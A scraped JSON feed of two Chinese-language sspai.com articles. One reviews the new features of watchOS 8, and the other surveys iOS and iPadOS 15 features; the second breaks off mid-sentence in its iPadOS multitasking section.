[{"title":"watchOS 8 正式版来了，这些新功能值得尝鲜","date":"2021-09-21 04:32:19","description":"\n<p>随着「科技春晚」的落幕，Apple 为我们带来了全新设计的 Apple Watch Series 7。与此同时，watchOS 8 也正式推送给了 Apple Watch 用户。我已经在自己的 Apple Watch SE 上日常使用测试版有一段时间了，借这次正式版发布的机会和大家一起来看一看 watchOS 8 都有哪些让我们眼前一亮的更新。</p>\n<h2>系统新特性</h2>\n<h3>新增人像模式表盘</h3>\n<p>watchOS 每次更新都会伴随着新表盘的出现，在 watchOS 8 中，人像模式表盘成了许多人眼里的「重磅更新」。想要设置人像表盘，你只需要在 Watch 应用中选择人像表盘，随后将自己拍摄的人像照片导入即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrmtb34tdhopdm24g.png\"><figcaption>图 / Apple</figcaption></figure><p>当你导入一张照片后，系统会自动识别画面中的主体和背景，并提供三种表盘样式。其中最特别的莫过于「顶部后方」，它会将时间放在画面主体后方。在实际体验中，如果照片主体不是人的话，往往不会出现「顶部后方」的选项。因此，你或许不能用猫猫来做人像表盘了（可以设置为人像模式表盘，但不支持「顶部后方」样式）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrndb34tdhn8pbjig.png\"></figure><p>此外，人像模式表盘还支持 3 种字体样式和 1 个复杂功能，你可以根据自己的喜好进行调整。</p>\n<h3>专注模式更新</h3>\n<p>与 iOS 15 一样，Apple Watch 也针对「专注」进行了更新，你可以将 iPhone 上的专注模式设置镜像到 Apple Watch 上，并在控制中心里快速启用。此外，专注模式还会根据你的使用习惯进行推荐，比如当你开始体能训练时会建议你开启对应的专注模式。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrnlb34tdhtodspc0.png\"></figure><h3><strong>与 iOS 更加统一的设计风格</strong></h3>\n<p>watchOS 8 在 App 内融入了 iOS 上的大标题设计，在视觉观感上与 iOS / iPadOS 更加统一。不过在 Apple Watch 这么小的屏幕上使用大标题设计无疑压缩了屏幕利用率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrntb34tdhj3i19p0.png\"></figure><p>拿「设置」来说，在 watchOS 7 中，你不需要滚动屏幕就能轻松点到「通用」，但 watchOS 8 则需要向上滚动屏幕才能更好地点击到。与 iOS 一样，当你向上滚动屏幕后，标题也会缩小到上方，不影响正常使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkro5b34tdhtodspcg.png\"><figcaption>左：watchOS 7；右：watchOS 8</figcaption></figure><p>不过，由于 watchOS 大部分 App 都采用了卡片形式来展示项目，经常需要在打开 App 后滚动屏幕来找到特定内容。因此，新的大标题设计虽然降低了屏幕利用率，但对实际体验的影响并不大。</p>\n<h3><strong>优化表盘设置过程</strong></h3>\n<p>在 watchOS 8 中，新增表盘的界面也迎来了大改，增加了分类选取界面以及表盘介绍。原先的设置中，在你选完表盘风格后，它会直接应用在手表上，你需要再次长按并选择「编辑」才能进行自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrodb34tdhj3i19pg.gif\"><figcaption>在 watchOS 8 中添加表盘</figcaption></figure><p>在新的表盘设置界面里，你会看到表盘以分类卡片的形式展示出来，点击左侧的表盘图标则可以查看它的详细介绍。如果你想添加某个表盘，只需要点击右侧的「添加」按钮即可直接进入编辑界面，完成编辑后按下数码表冠就能保存并退回表盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrotb34tdhopdm250.png\"><figcaption>在 watchOS 8 中添加表盘</figcaption></figure><p>相比于 watchOS 7 繁琐的表盘设置步骤，watchOS 8 的设置过程显然要更加直观且方便。对我来说，不再需要打开手机也能获得非常舒适的表盘设置体验，又让 Apple Watch 多了一个脱离手机的理由。</p>\n<h3><strong>App 视图新增长按菜单</strong></h3>\n<p>watchOS 8 还为 App 视图增加了长按菜单，当你在 App 视图长按应用或空白区域便会打开菜单。你可以在菜单中修改 App 的展示方式，或是选择编辑 App。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrp5b34tdhtodspd0.gif\"><figcaption>谁会想到这个界面居然不能截图</figcaption></figure><p>如果你经常需要切换 App 视图来查找应用的话，此功能会是一个非常高效的更新，至少你不再需要到「设置」或手机上切换视图了。但长按菜单的加入也让删除应用的步骤又多了一步，对于没有切换视图需求的用户来说，这个改动未必是个好消息。</p>\n<h3><strong>系统触感反馈</strong></h3>\n<p>系统触感反馈也许是 watchOS 8 里最「无感」的一个更新，因为它自然得就像本该存在的一个特性。至少在我更新完系统，输入密码时的振动反馈并不让我觉得意外或惊喜，反而觉得这是本来就有的功能。</p>\n<p>除了输入密码时的按键反馈外，「设置」里的开关、「电话」里的拨号键盘等地方都有了交互反馈。当然，你也可以在「设置 - 声音与触感」中将「系统触感反馈」关闭。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrptb34tdhopdm25g.png\"><figcaption>watchOS 8 新增「系统触感反馈」</figcaption></figure><h3><strong>控制中心布局微调</strong></h3>\n<p>本次更新还对控制中心进行了微调，原先分布在角落的手机、定位等图标被集中放在了顶部居中的位置。在你开启专注模式后，对应的图标也会显示在其中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrptb34tdhj3i19q0.png\"><figcaption>左：watchOS 7，右：watchOS 8</figcaption></figure><p>除此之外，控制中心也删去了独立的「睡眠」开关，并整合进「专注」菜单中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrq5b34tdhtodspdg.png\"><figcaption>watchOS 8 的睡眠模式被放在「专注」里</figcaption></figure><h2>系统新 App</h2>\n<h3><strong>查找设备、查找物品</strong></h3>\n<p>在 watchOS 7 里，虽然有一个「查找」图标的应用，但只能用于查找联系人，而无法定位自己的其他设备。到了 watchOS 8，Apple 在 watchOS 上将「查找」功能进行细化，分成了查找设备、查找物品和查找联系人 3 个应用，并单独绘制了不同的图标。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrqdb34tdhn8pbjj0.jpeg\"></figure><p>以「查找设备」为例，我可以直接在 Apple Watch 上看到自己其他设备的定位，并进行播放声音、启用丢失模式等操作，或者直接导航指设备所处位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrqdb34tdhopdm260.jpeg\"></figure><h3><strong>通讯录</strong></h3>\n<p>其实在 watchOS 7 的「电话」应用中就已经有「通讯录」的选项，但我只能进行打电话、发短信等操作，无法添加、删除或编辑联系人。到了 watchOS 8，Apple 终于为我们带来了「完整版」的通讯录应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrqlb34tdhj3i19qg.png\"></figure><p>应用目前支持编辑联系人的姓名、电话、邮箱、地址等信息。除了屏幕比较小，以及缺少一些词条（比如关系、昵称）之外，基本可以代替 iOS 来快速添加联系人了。</p>\n<h3>正念</h3>\n<p>不知道你会不会跟我一样，经常使用 Apple Watch 的「呼吸」应用来让自己放松。事实上，有规律的深呼吸不但能够帮你缓解压力，也能够帮你更好地专注在手头的工作，甚至是促进入睡。</p>\n<p>在 watchOS 8 中，「呼吸」应用迎来了一次大更新。首先便是它的名字由「呼吸」改为「正念」，并加入了「沉思」功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrqtb34tdhj3i19r0.png\"></figure><p>全新的「沉思」功能可以帮助你更加专注，并且有助于增强积极的情绪。你可以选择让自己最能够放松的方式来进行「沉思」，无论是闭上双眼，舒服地坐着，还是来回踱步都可以，不会像「呼吸」一样被打断。</p>\n<p>开启「沉思」后，Apple Watch 会向你提出不同的建议，比如「想想那些令你开心的事情，它们为什么会令你开心」，或是「想想那些令你心怀感激的事情」。作为初期测试版本，目前仍有部分建议未汉化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrr5b34tdhtodspe0.gif\"></figure><p>同时，本次更新还给「正念」应用带来了更精致的动画和退出功能。在进行「呼吸」或「沉思」的过程中，你可以随时向右滑动屏幕并提前结束，此次数据将不会进行记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrrtb34tdhopdm26g.gif\"></figure><h2>系统 App 更新</h2>\n<h3>功能更多的钱包</h3>\n<p>除了传统的会员卡、银行卡、票据等凭证，在 watchOS 8 中钱包还可以添加车钥匙、门钥匙等，并且还可以通过家庭共享功能与家人或者朋友之间进行共享。目前，已经有不少知名的锁具品牌、酒店品牌和汽车品牌支持了钱包 App 中的电子钥匙功能，未来还将会有越来越多的品牌接入，我们的生活将变得越来越便利。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrslb34tdhj3i19rg.jpeg\"><figcaption>图 / Apple</figcaption></figure><h3>更了解你的睡眠监测</h3>\n<p>在睡眠 App 中，我可以自定义起床和就寝时间，还可以设置闹钟的声音与触感。启用后，Apple Watch 会计算我深度睡眠期间每分钟的呼吸数，在健康 App 中通过详细的数据和图表展示出来，让我对自己的睡眠情况有更好的了解。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrstb34tdhtodspeg.png\"><figcaption>图 / Apple</figcaption></figure><h3>更贴心的体能训练</h3>\n<p>作为主打功能，运动监测一直是 Apple Watch 的强项，而体能训练 App 在其中扮演着重要的角色。在 watchOS 8 中，体能训练 App 支持了语音播报功能，当我在锻炼中达到特定节点时，Apple Watch 会直接通过语音向我播报，我不用抬起手腕也能知道自己当前的完成进度。以计时锻炼为例，Apple Watch 会在目标完成一半时提醒我「已达成一半，XX 分钟」，如果我按下了暂停键，它也会通知我「训练暂停」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrt5b34tdhj3i19s0.jpeg\"></figure><h3><strong>全新设计的「家庭」应用</strong></h3>\n<p>watchOS 本次更新还带来了全新设计的「家庭」应用，我可以更加方便地管理家中的智能设备。同时 watchOS 8 也支持绑定更多的智能设备并与之联动，比如有人按门铃时，Apple Watch 就会弹出相应通知，如果门口有摄像头的话，还可以直接查看摄像头拍摄到的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrtdb34tdhopdm270.jpeg\"></figure><h3><strong>iMessage 体验优化</strong></h3>\n<p>本次更新中，iMessage 迎来了非常大的改动，其中最直观的就是输入界面的变化。在 watchOS 8 中，iMessage 的输入界面进一步朝 iOS 靠拢，从原先的多个图标变为 App Store 图标 + 输入框。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrtlb34tdhn8pbjjg.png\"><figcaption>左：watchOS 7，右：watchOS 8</figcaption></figure><p>原先的 Digital Touch、语音消息和 Apple Pay 等功能都被收入了 App Store 图标里。我还可以在这里面发现一个新的粉色图标，这是 watchOS 为 iMessage 带来的新功能：#image，我可以用它在 GIPHY 搜索动图并直接发送给朋友。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrtlb34tdhopdm27g.png\"><figcaption>由于网络原因，在国内访问 GIPHY 看到的大概率是右图中的画面</figcaption></figure><p>除此之外，watchOS 8 还对文字输入体验做了优化。过去在输入文字时，如果想要将光标移到特定位置，就得先双击它前方的词语才能移动。但如果我想更改词语中的某个字，或者系统识别错了词语的话，我就只能删掉后再重新输入，非常麻烦。</p>\n<p>在 watchOS 8 中，我可以直接用数码表冠来移动光标，配合表冠的振动反馈，我可以非常轻松地停在任意位置。此外，原先的表冠选词也得以保留，我只需要选中想要修改的词语，并旋转数码表冠就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrttb34tdhn8pbjk0.gif\"></figure><p>不仅如此，watchOS 8 还针对多语言混排、Emoji 进行了优化。在输入界面向上滑动屏幕即可切换不同的语言进行输入，对于有中英混排需求的人来说，再也不用担心写出来的字母被识别成汉字了。如果我想在文字中插入 Emoji，也只需点击左下角的 Emoji 图标并在菜单中选择即可，非常方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrudb34tdhn8pbjkg.gif\"></figure><h3><strong>音乐 App 重新设计</strong></h3>\n<p>与「照片」应用一样，「音乐」应用也获得了全新的设计。除了将菜单图标改为彩色以外，我现在也可以在「资料库」中直接查看专辑图，并打开对应专辑进行播放，这样的改动也更贴近 iOS 使用习惯。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrutb34tdhn8pbjl0.png\"></figure><h3><strong>全新设计的「照片」应用</strong></h3>\n<p>在过去的 watchOS 里，我们只能在 Apple Watch 上查看自己在 iPhone 上选定的相册，并左右滑动查看照片。虽然也能实现「查看照片」的功能，但这样的体验显然不能称得上是一个「相册」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrv5b34tdhj3i19sg.gif\"></figure><p>相比之下，watchOS 8 的「照片」应用就更像一个「相册」了。虽然我还是只能选中一个相册导入进 Apple Watch，但新增的层级功能让它有了「相册」的感觉。</p>\n<p>进入「照片」应用后，我不再会直接看到照片，而是先看到相册的选择界面，点开一个相册后，则会看到类似 iOS 那样的照片网格，再次点击照片才能进入全屏界面。这样的操作逻辑更加贴近 iOS，在使用体验上也比原本要更加舒适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrvlb34tdhopdm280.png\"><figcaption>全新的「照片」应用</figcaption></figure><p>既然 watchOS 为「照片」应用增加了层级，肯定不能只在上面放一个相册。于是，watchOS 8 还将 iOS 的「回忆」功能带到了 watchOS 上。</p>\n<p>我只需要在 iPhone 上的 Watch 应用内找到「照片」，随后打开「同步回忆」，系统便会自动将我的照片回忆同步到 Apple Watch 上。这些照片会以「回忆」相册的形式在 Apple Watch 上显示。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrvtb34tdhopdm28g.jpeg\"></figure><p>值得一提的是，「回忆」相册的显示方式与普通相册的照片网格不同，而是采用了大小不等的「马赛克」式排列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vkrvtb34tdhtodspf0.png\"><figcaption>道理我都懂，但这碗泡面真的不「美味」</figcaption></figure><p>除了展示效果提升外，全新的「照片」应用也带来了交互上的改动。在原先的「照片」里，我们只能将选中的图片设置为表盘，但在 watchOS 8 中，我还可以用分享按钮将照片通过 iMessage 或邮件的方式分享给朋友。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vks05b34tdhtodspfg.jpeg\"><figcaption>watchOS 8 支持直接分享照片</figcaption></figure><h3>计时器支持多个同时运行</h3>\n<p>在 watchOS 8 里，「计时器」终于支持同时设置多个倒计时了。对于频繁进行多线性任务处理的人来说，这个功能简直就是刚需。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4vks0db34tdhn8pbjlg.jpeg\"></figure><h2>其他值得一提的新功能</h2>\n<ul>\n<li>常亮显示屏（Always-On Display）支持计算器、地图和音乐等 App</li>\n<li>Fitness+ 支持锻炼筛选</li>\n<li>天气应用支持恶劣天气通知</li>\n<li>消息提醒的「关闭」按钮改为「忽略」</li>\n<li>新增「辅助触控」功能，可以通过手势来操控 Apple Watch</li>\n<li>控制中心实时显示耳机音量</li>\n<li>家庭共享功能支持交通卡的分享</li>\n</ul>\n<p>你还在 watchOS 8 中发现了哪些值得关注的新功能？欢迎在评论区和我们讨论分享。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，带你了解 Apple 新硬件 &amp; 新系统 📱</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68748"},{"title":"iOS / iPadOS 15 正式版来了，升级后先试试这些新功能","date":"2021-09-21 01:00:44","description":"\n<p>9 月 21 日，经过数月的测试之后，iOS 15 和 iPadOS 15 终于正式与大家见面。专注模式、实况文本、全新 Safari 浏览器等等都是 iOS / iPadOS 15 中值得关注的新功能；iPadOS 15 中，还有全新的多任务处理和快速备忘录体验，并终于支持了 App 资源库。</p>\n<p>少数派为你整理了新版系统中值得关注的新功能和新特性，如果你升级新系统之后想了解有哪些新功能，或者还在观望是否需要升级，这篇文章都能帮助到你。</p>\n<p>如果你想知道自己的设备是否能够升级新版系统，可以在 <a href=\"https://www.apple.com.cn/ios/ios-15/\" target=\"_blank\">iOS 15</a> 和 <a href=\"https://www.apple.com.cn/ipados/ipados-15/\" target=\"_blank\">iPadOS 15</a> 官网进行查看。其中，iOS 15 支持 iPhone 6s / 6s Plus 及之后推出的 iPhone，另外还支持第七代 iPod touch；iPadOS 15 支持 iPad Air 2 以及之后推出的 iPad。</p>\n<h2>iOS 15</h2>\n<p>iOS 15 中，除了新的通知样式和管理方式，专注模式 (Focus)、实况文本 (Live Text)、全新天气 App 等的加入，也值得我们关注。</p>\n<h3>专注模式 / 通知管理</h3>\n<p>iOS 15 重新设计了通知横幅的提醒样式，通知中的应用图标尺寸更大，如果是来自信息 App 或者其它通讯工具中的通知，还会直接显示消息发送者的头像，方便用户更快了解通知来源和类型。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/3979c908795013fec6a700f6bc3b2eda.jpeg\"><figcaption>图：Apple</figcaption></figure><p>由于应用图标和通知内容方面布局的调整，通知横幅中的文本也变得更加直观与易读。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/0a8baa98e887154d785c4c43066e8984.png\"></figure><p>除了样式调整，iOS 15 推出了新的通知形式：通知摘要 (Notification summary)。通知摘要允许用户指定特定 App，这些 App 的通知会折叠在通知摘要横幅中，并在一天中的指定时间进行推送，通知摘要的每日推送次数支持设置范围为 1-12 次，每次均可以自行设置时间，联系人信息的通知不会被折叠进通知摘要。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/95d584a4aad630410a0416d53d6d0d6c.PNG\"></figure><p>通知摘要功能会在设备本地学习用户的使用习惯，将通知按照优先级顺序自动进行排列</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/3aaa60e09f822354579c9aa4e60f935f.png\"></figure><p>为了进一步让用户控制通知功能，降低无关通知带来的打扰，iOS 15 推出了全新的通知管理功能：专注模式 (Focus)。专注模式可以让用户根据不同的场景，允许不同的 App 发送通知，还支持自动化开启以及在其它装置上进行同步。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/4e7383daad58d7a202d6916ddbb84293.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/125a721943b23a56115457b632b5f728.PNG\" alt=\"\"></figure><p>比如，工作的时候启用工作模式，用户可以指定只有工作上的同事与合作伙伴可以发送消息、拨打电话给自己，也可以指定只有如飞书、Notion 等工作上需要的 App 才能发送通知。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/421ccc1f06af59732f6f96384e317ca2.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/8f15c88cb6531bdba9a450a3e9768246.PNG\" alt=\"\"></figure><p>专注模式还支持设置主屏幕页面的显示状态，比如你可以单独设置一个页面，将所有工作的 App 放在页面中，开启工作模式的时候，主屏幕只会显示着一个页面，开启个人模式的时候，这个页面就会隐藏，不会有工作相关的 App 打扰到你。</p>\n<p>开启专注模式或者勿扰模式之后，当有好友发送 iMessage 消息给你时，对方的信息窗口会提示你开启勿扰模式或者已通过专注模式开启勿扰功能。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/21/c92adc81a54bfa8aa81513f1ba600fe7.png\"></figure><h3>实况文本</h3>\n<p>实况文本 (Live Text) 是 iOS 15 上系统级的 OCR 文本识别工具，使用方法也非常多样。首先，在系统相机中，如果当前取景框识别到画面中有文本内容，取景框右下角 (竖屏) 或者右上角 (横屏) 会自动显示实况文本按钮，点击之后取景框内会将识别到的文字以单独的弹窗显示，在弹窗中选择文字之后可以进行拷贝、查询、分享或者通过系统翻译 App 进行翻译的操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/b83818466be6724a96ca0a81ea5dd91e.jpg\"></figure><p>在第三方 App 中，也能直接调用实况文本功能。在输入框点击唤出键盘之后，再次点按输入框唤出文本操作快捷选单，选择「来自相机的文本」，整个键盘区域都会变成相机取景窗，直接对准文字系统识别到的内容会自动输入进文本框，点击取景框右下角的实况文本按钮则可以进行与上述相机内相同的多项文本操作。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/d527ff562e673623b4bdb5c89ef73500.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/355f8b58ba0c24a362a3f1ed0562568a.PNG\" alt=\"\"></figure><p>除了通过相机取字，iOS 15 也支持支持直接识别已有照片的文字。比如在照片或者信息应用中点击含有文字的图片，右下方会自动出现实况文本按钮，点击即可开始选字操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/5ad1e5d88666be4d07bd1ae36471e537.jpeg\"></figure><p>除了识别文字，WWDC21 大会上还介绍了 iOS 15 中名为 Visual Look Up 的功能，可以帮助用户识别相片中的场景、物品，支持的内容范围包括动植物、绘画、书本、建筑等各种信息。不过，这项功能似乎没有在 iOS 15 的第一个正式版本中上线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/fc37722f5daa2709f216b60f0768e0bd\"><figcaption>图：Apple</figcaption></figure><h3>天气</h3>\n<p>天气 App 在 iOS 15 中的变化也非常大。首先，应用经过了完全重新设计，不同天气数据会以卡片的形式从上到下进行展示，比如空气质量、24 小时天气预报、10 日天气预报等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/efea0214d074d50c1ee54618d49c6cbd.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/21/ca98926f7cba8d7a52fa59f83f127a26.PNG\" alt=\"\"></figure><p>值得一提的是，天气 App 不仅保留了之前的「拟物」界面设计，对于降雨、云朵等天气状况的动效设计还变得更加精致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/0555b447d5d9b0800838aa77dbebd4c8.gif\"></figure><p>数据方面，新版天气 App 支持了更多类型的数据展示，比如紫外线指数、日落时间、风速和风向、能见度、气压等等。点击左下角的按钮，还可以根据气温、降水强度、空气质量查看天气地图。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/b6137f955814dc11c82c6113b8d42643.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/4ac3349ee268c1444a6f882eddc63b6b.PNG\" alt=\"\"></figure><p>最后，天气 App 终于支持了通知功能，应用支持指定特定城市，当这些地方出现降雨或者降雪天气时，应用就会发送提醒通知。</p>\n<h3>FaceTime</h3>\n<p>SharePlay 是 FaceTime 在 iOS 15 上获得的新功能，它可以让正在通话的使用者之间共享正在播放的音乐、视频或者是屏幕内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/975022f00d66c17191effe784e547421.png\"><figcaption>图 / Apple</figcaption></figure><p>为了提供更好的通话体验，iOS 15 为 FaceTime 带来了语音突显 (Voice Isolation)、空间音频、人像模式。其中，语音突显功能会智能识别通话时的人声，降低背景噪音，以获得更好的通话质量；空间音频可以带来更加「立体」的通话体验，人像模式则能让人物在画面中获得强调，让通话者成为画面中的焦点。</p>\n<p>此外，语音突显和人像模式不只能在 FaceTime 中使用，开发者无需适配也能在第三方 App 中直接使用 2 项功能。如果你正在拨打语音电话或者视频通话，可以在控制中心找到功能入口并进行打开或者关闭控制。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/2e1f475576db578a2b9337f8b21226fa.png\"></figure><p>新版 FaceTime 增加了「通话链接」功能，通过点击应用主界面的「创建链接」按钮，FaceTime 会自动创建一个名为「FaceTime 通话链接」的空白通话，用户可以创建不限数量的通话链接，并将链接分享给他人，他人可以通过链接直接加入 FaceTime 通话。通过 FaceTime 即将推出的 Web 版本，Android 和 Windows 也可以通过通话链接加入通话。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/c1f4b872ba3785c8d52a639ffb5ecea9.jpg\"></figure><p>根据此前 Apple 公布的消息，SharePlay 的上线时间将被推迟，我们无法在 iOS 15 / iPadOS 15 的第一个正式版本中开启它。想要用上这项功能，还得再等等。</p>\n<h3>信息</h3>\n<p>信息 App 方面，除了按照惯例增加 Memoji 表情之外，「与您共享」和照片合辑 (Photo collections) 都是值得关注的特性。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/8f543c1ac305031421fdcd7eb363ae2d.png\"><figcaption>图 / Apple</figcaption></figure><p>「与您共享」功能可以在信息的系统设置中开启，目前支持了系统照片、播客、视频、音乐和 Safari 浏览器。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/360a53983c31e2b5e73a16af64dea940.jpeg\"></figure><p>开启之后，你通过 iMessage 给其他人发送的照片、播客节目、音乐、网址等等，都会在对应的 App 内出现在共享板块中，同时显示共享来源。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/10/47e97c12f910d79f3688b7d84e973b9b.jpg\"><figcaption> Safari 中的「与您共享」板块</figcaption></figure><p>现在，你还可以通过 iMessage 同时发送多张照片，照片会自动合辑成组，左右滑动可以切换查看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/9f8f6654ebc1999a8689ae80d285014e.gif\"></figure><h3>照片</h3>\n<p>在照片应用中，回忆功能提供了更多自定义选项，目前应用内提供了 12 种不同效果的滤镜可供选择，还集成了 Apple Music，用户可以选择热门的建议歌曲、或者通过搜索，将喜欢的歌曲作为回忆的背景音乐，让回忆具有更加符合自己喜好的风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/daddf1858b7b28d5a0f13b9e6bf94c67.gif\"></figure><h3>其它值得关注的 iOS 15 新功能</h3>\n<ul>\n<li>钱包 App 将支持身份证、工牌、门卡类型的卡券，Aqara 将作为国内首批支持厂商。</li>\n<li>健康 App 新增步行稳定性分析、趋势数据，支持与家人共享健康数据。</li>\n<li>系统隐私设置选项中增加「记录 App 活动」，这里会记录 7 天内所有 App 访问过的数据以及访问频次。</li>\n<li>辅助功能支持为单个 App 单独设置文本粗体样式、字号等。</li>\n<li>新增查找、Game Center、App Store、睡眠模式等系统功能小组件。</li>\n<li>设备关闭或被抹掉全部内容之后，也能通过查找 App 寻找位置。</li>\n<li>地图 App 应用中，城市道路、建筑细节变得更丰富，驾驶时的导航数据也变得更加精准，支持了 AR 步行导航和公共交通整合的功能等。</li>\n</ul>\n<h2>iPadOS 15</h2>\n<p>除了和 iOS 15 一样带来了新的专注模式、通知管理、实况文本、聚焦搜索等新功能，今年的 iPadOS 15 更新依然围绕着「专为 iPad 设计」这一主题，进一步将 iPad 的使用场景和定位与 iPhone 进行了区分。</p>\n<h3>多任务处理</h3>\n<p>iPadOS 15 重新设计了多任务处理有关的大部分功能。首先是分屏入口变得更容易找到，所以正在显示的 App 顶部都有一个「…」的菜单，点击以后就可以看到 iPad 上的分屏入口了，更方便用户用户找到分屏的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/08862d76842e7c05b2373bbc519638e3\"><figcaption>入口变得更易使用</figcaption></figure><p>iPadOS 15 还优化了分屏以后选择 App 的方式。在 iPadOS 14 中，我们想要打开另一个软件的分屏，只能在 Dock 栏中选择，选择范围非常小，只有常驻的应用和最近打开的 3 个非常驻应用。在 iPadOS 15 通过顶部菜单选择分屏模式以后，当前显示的 App 会暂时挪动到一侧并显示主界面，方便用户可以从主界面和 App 资源库中自由选取应用，大大减少了过去繁复的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/6f6e378259270e4a20d835c2ae44180a\"><figcaption>不止可以在 Dock 还可以在桌面和 App 资源库中选择</figcaption></figure><p>当然如果你已经习惯了以前拖拽新建分屏的操作，iPadOS 15 